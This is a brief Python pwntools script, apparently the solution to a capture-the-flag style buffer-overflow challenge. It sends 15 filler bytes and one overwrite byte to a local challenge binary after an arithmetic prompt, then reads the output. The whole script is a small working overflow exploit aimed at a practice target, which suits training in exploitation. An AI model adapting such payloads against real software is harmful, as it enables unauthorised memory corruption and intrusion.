from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

payload = b'123456789ABCDEF' + p8(0x1) + b'\n'

print(payload)

io = process('/challenge/buffer-overflow-level1.4')

io.sendafter("3 + 5 = ?\n", payload)

while True:
    io.recvline()
